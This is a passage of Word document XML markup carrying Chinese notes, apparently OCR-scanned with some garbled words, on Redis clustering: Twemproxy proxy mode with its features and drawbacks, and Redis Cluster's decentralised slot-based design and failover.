          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>四</w:t>
      </w:r>
      <w:bookmarkEnd w:id="142"/>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集群</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(proxy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>型)模式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Twem proxy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Twitter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>开源的一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>memcache</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>快速/轻量级代理服务 器；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Twemproxy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是一个快速的单线程代坦程 ＞序，支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Meme ached ASCII</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>协议和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">redis </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>协议。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>特点：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="730"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="143" w:name="bookmark152"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="143"/>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 xml:space="preserve">多种 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">hash </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>算法：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">MD5、CRC16、CRC32、CRC32a、hsieh、murmur </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Jenkins</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="745"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="144" w:name="bookmark153"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="144"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>支持失败节点自动删除</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="760"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="145" w:name="bookmark154"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:bookmarkEnd w:id="145"/>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后端</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Shazding</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>分片逻辑对业务透明，业务方的读写方式和操作单个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Redis </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>—致 缺点：</w:t>
      </w:r>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1、増加了新的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Proxy,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>需要维护其高可用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="380" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2x failover</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>逻辑需要自己实现，其本身不能支持故障的自动转移可扩展性差，进行扩 缩容都需要手动干预</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="885"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="146" w:name="bookmark155"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>五</w:t>
      </w:r>
      <w:bookmarkEnd w:id="146"/>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集群(直连型)模式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>从</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>redis 3.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>之后版本支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>re dis-cluster</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>集群，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Re di s~C lust er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>采用无中心结构，每 个节点保存数据和整个集群状态,每个节点都和</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>其他所有节点连接。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>特点：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="730"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="147" w:name="bookmark156"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="147"/>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无中心架构(不存在哪个节点影响性能瓶颈)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">少了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Proxy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>层。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="745"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
        <w:sectPr>
          <w:headerReference r:id="rId13" w:type="default"/>
          <w:headerReference r:id="rId14" w:type="even"/>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1475" w:right="1650" w:bottom="1460" w:left="1714" w:header="0" w:footer="1032" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:bookmarkStart w:id="148" w:name="bookmark157"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="148"/>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数据按照</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>slot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>存储分布在多个节点，节点间数据共享，可动态调整数据分布。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="760"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="149" w:name="bookmark158"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:bookmarkEnd w:id="149"/>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可扩展性，可线性扩展到1000个节点，节点可动态添加或删除。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="760"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="150" w:name="bookmark159"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:bookmarkEnd w:id="150"/>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高可用性，部分节点不可用时，集群仍可用。通过増加</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Slave</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>做备份数据副本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="775"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="151" w:name="bookmark160"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:bookmarkEnd w:id="151"/>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实现故障自动</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>failover,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>节点之间通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>gossip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>协议交换状态信息，用投票机制完 成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Slave</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
